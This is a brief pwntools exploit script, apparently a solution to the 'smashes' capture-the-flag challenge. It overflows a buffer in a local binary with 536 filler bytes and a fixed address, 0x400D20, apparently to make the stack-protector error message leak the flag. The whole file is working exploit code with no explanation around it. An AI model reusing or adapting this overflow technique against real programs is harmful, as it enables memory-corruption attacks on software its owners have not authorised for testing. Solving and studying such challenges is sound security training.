from pwn import *

io = process("./smashes")

payload = 'A'*536 + p64(0x400D20)
io.sendlineafter('name? ', payload)
io.sendlineafter('flag: ', '')

io.interactive()